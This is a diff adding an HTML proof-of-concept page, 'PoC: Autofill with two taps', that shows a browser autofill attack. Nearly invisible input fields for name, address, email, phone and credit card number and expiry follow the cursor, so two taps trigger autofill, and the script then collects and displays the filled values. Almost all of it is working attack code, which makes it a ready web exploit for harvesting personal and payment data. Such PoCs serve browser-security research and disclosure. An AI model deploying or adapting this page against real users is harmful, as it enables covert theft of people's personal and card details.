@@ -1,0 +1,140 @@
+<!doctype html>
+<html>
+<head>
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<style>
+html {
+  font-family: sans-serif;
+  touch-action: manipulation;
+}
+
+body {
+  overflow: hidden;
+  cursor: pointer;
+  touch-action: manipulation;
+}
+
+input {
+  position: absolute;
+  top: 0;
+  left: -300px;
+  opacity: 0.0001;
+}
+
+#inputElem {
+  cursor: pointer;
+}
+
+#output {
+  padding: 0.2em;
+  background: #eee;
+}
+
+#output.success {
+  background: lightgreen;
+}
+
+#instructions {
+  text-align: center;
+  margin-top: 200px;
+  font-size: 2em;
+  user-select: none;
+}
+</style>
+</head>
+
+<body>
+<h1>PoC: Autofill with two taps</h1>
+
+<p id="output">(no output yet...)</p>
+
+<!-- Group 1 -->
+<input id="groupOneElem" name="name" autocomplete="name">
+<input name="email" autocomplete="email">
+<input name="address-line1" autocomplete="address-line1">
+<input name="address-line2" autocomplete="address-line2">
+<input name="city" autocomplete="address-level2">
+<input name="state" autocomplete="address-level1">
+<input name="country-name" autocomplete="country-name">
+<input name="postal-code" autocomplete="postal-code">
+<input name="tel" autocomplete="tel">
+
+<!-- Group 2 -->
+<input id="groupTwoElem" name="cc-name" autocomplete="cc-name">
+<input name="cc-number" autocomplete="cc-number">
+<input name="cc-exp-month" autocomplete="cc-exp-month">
+<input name="cc-exp-year" autocomplete="cc-exp-year">
+
+<p id="instructions">Tap twice anywhere in page</p>
+
+<script>
+var inputElem;
+
+var setMainField = () => {
+  if (window.location.search.indexOf('creditcard') === -1) {
+    var groupOneElem = document.getElementById('groupOneElem');
+    groupOneElem.id = 'inputElem';
+    inputElem = groupOneElem;
+  } else {
+    var groupTwoElem = document.getElementById('groupTwoElem');
+    groupTwoElem.id = 'inputElem';
+    inputElem = groupTwoElem;
+  }
+}
+
+setMainField();
+
+var updateOutput = () => {
+  var inputs = document.querySelectorAll('input');
+  var inputValues = [];
+  inputs.forEach((elem) => {
+    if (elem.value.length) {
+      inputValues.push(elem.value);
+    }
+  });
+  output.innerText = inputValues.join(', ');
+  output.classList.add('success');
+}
+
+inputElem.addEventListener('change', () => {
+  if (inputElem.value.length > 0) {
+    setTimeout(updateOutput, 10);
+  }
+});
+
+var inputReady = false;
+
+var handleMouseMove = (e) => {
+  var inputX = e.clientX - 50;
+  var inputY = e.clientY - 10;
+  inputElem.style.left = inputX + 'px';
+  inputElem.style.top = inputY + 'px';
+  inputReady = true;
+}
+
+window.addEventListener('mousemove', handleMouseMove);
+
+window.addEventListener('mousedown', (e) => {
+  if (!inputReady) {
+    handleMouseMove(e);
+    return;
+  }
+  inputElem.style.left = (e.clientX - 100) + 'px';
+  inputElem.style.top  = (e.clientY - 50) + 'px';
+});
+
+/* Anti double-tap zoom (Safari iOS fix) */
+let lastTouch = 0;
+document.addEventListener('touchend', function (e) {
+  const now = Date.now();
+  if (now - lastTouch <= 300) {
+    e.preventDefault();
+  }
+  lastTouch = now;
+}, { passive: false });
+</script>
+
+</body>
+</html>
